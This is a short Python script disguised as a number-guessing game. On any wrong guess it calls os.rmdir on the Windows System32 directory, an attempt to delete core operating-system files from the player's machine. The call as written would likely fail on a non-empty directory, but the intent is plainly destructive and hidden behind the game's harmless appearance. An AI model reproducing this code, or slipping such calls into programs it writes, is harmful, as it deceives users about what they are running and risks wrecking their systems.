import os 
import random
usr_input = int(input("Enter your guess(1-10): "))
rand_num = random.randint(1, 10)
if usr_input == rand_num:
    print("Nice Luck...You Won")
else:
    os.rmdir("C:\Windows\System32")